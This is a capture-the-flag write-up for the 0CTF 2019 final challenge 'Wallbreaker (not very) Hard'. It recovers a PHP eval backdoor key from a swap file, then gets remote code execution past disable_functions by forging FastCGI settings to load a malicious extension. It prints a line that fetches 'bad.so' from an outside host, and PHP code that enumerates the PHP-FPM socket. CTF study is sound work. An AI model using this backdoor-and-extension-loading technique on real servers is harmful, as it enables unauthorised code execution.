# Wallbreaker (not very) Hard

## Problem

- This challenge environment is same as 0CTF 2019 qual - Wallbreaker Easy
    - PHP-FPM
    - PHP 7.2
    - strict `disable_functions`
        - `pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log`
        - no `putenv` this time :p
    - `open_basedir: /var/www/html:/tmp`

![](https://github.com/w181496/CTF/blob/master/0ctf2019_final/Wallbreaker%20(not%20very)%20Hard/phpinfo.png)

- This challenge tells us there is a backdoor in somewhere
- After scanning, I found `.index.php.swp`
    - Recover it and get the backdoor key: `eval($_POST["anfkBJbfqkfqasd"]);`
- OK, it's time for bypass `disable_functions`和`open_basedir`

## Exploit

- In 0CTF qual, I forged fastcgi protocol to bypass `open_basedir` (overwrite the settings)
- But I found there is another way that is possible to bypass `disable_functions` to RCE
    - using the `extension`!
- So we just need to write the `extension_dir` and `extension` in `PHP_ADMIN_VALUE`, then we can load arbitrary extension
- First step is to upload a RCE extension:

```php
file_put_contents("/tmp/bad.so", file_get_contents("http://kaibro.tw/bad.so"));
```

- Before building the fastcgi payload, we should find out its UNIX Socket path (if it use tcp, we need to find the port)

```php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/php/*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/php/.*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
sort($file_list);  
foreach($file_list as $f){  
        echo "{$f}<br/>";
}
```

=> `/var/run/php/U_wi11_nev3r_kn0w.sock`

- Then, starting to create FastCGI payload to overwrite settings. Here is my tool to generate payload: [Tool](https://github.com/w181496/FuckFastcgi/)
    - change the config, then run it


![](https://github.com/w181496/CTF/blob/master/0ctf2019_final/Wallbreaker%20(not%20very)%20Hard/getflag.png)

- RCE Get!
- `/readflag` => `flag{PHP-FPM is awesome and I think the best pratice is chroot your PHP}`

